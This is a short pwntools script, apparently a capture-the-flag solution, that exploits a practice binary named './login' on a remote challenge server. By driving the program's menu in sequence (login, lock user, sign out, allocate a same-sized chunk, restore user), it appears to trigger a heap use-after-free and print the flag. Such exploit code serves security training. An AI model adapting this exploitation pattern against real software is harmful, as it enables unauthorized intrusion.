from pwn import * 
import os 
os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
# nc thekidofarcrania.com 13226
gdbscript="""
init-pwndbg
continue
""".format(**locals())

exe = './login'
elf = context.binary = ELF(exe, checksec=True)
# context.log_level = 'ERROR'
context.log_level = 'INFO'
# context.log_level = 'DEBUG'

def login(buffer):
    sh.sendlineafter(b'>', b'1')
    sh.sendlineafter(b':', f'{buffer}')

def sign_out():
    sh.sendlineafter(b'>', b'2')

def print_flag():
    sh.sendlineafter(b'>', b'3')
    sh.sendlineafter(b'?', b'A' * 0x30) # 48 (allocate the same chunk as the 1st one)

def lock_user():
    sh.sendlineafter(b'>', b'4')

def restore_user():
    sh.sendlineafter(b'>', b'5')

sh = start()

login(b'AABBCCDD')
lock_user()
sign_out()
print_flag()
restore_user()

sh.sendlineafter(b'>', b'3')

sh.interactive()
